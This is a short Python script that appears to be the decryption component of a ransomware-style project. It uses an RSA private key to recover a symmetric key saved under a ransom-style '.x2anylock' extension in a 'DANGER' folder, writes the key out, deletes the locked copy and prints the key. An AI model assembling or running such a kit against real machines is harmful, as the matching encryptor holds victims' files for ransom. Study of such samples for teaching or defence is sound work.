import os
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

script_dir = os.path.dirname(os.path.abspath(__file__))
localRoot = os.path.join(script_dir, 'DANGER')
encrypted_key_path = os.path.join(localRoot, 'YOUR_KEY.txt.x2anylock')
decrypted_key_path = os.path.join(localRoot, 'YOUR_KEY.txt')

with open(encrypted_key_path, 'rb') as f:
    enc_fernet_key = f.read()
    print(enc_fernet_key)
private_key = RSA.import_key(open('private.pem').read())
private_crypter = PKCS1_OAEP.new(private_key)
dec_fernet_key = private_crypter.decrypt(enc_fernet_key)
with open(decrypted_key_path, 'wb') as f:
    f.write(dec_fernet_key)

os.remove(encrypted_key_path)

print(f'> Private key: {private_key}')
print(f'> Private decrypter: {private_crypter}')
print(f'> Decrypted fernet key: {dec_fernet_key}')
print('> Decryption Completed')

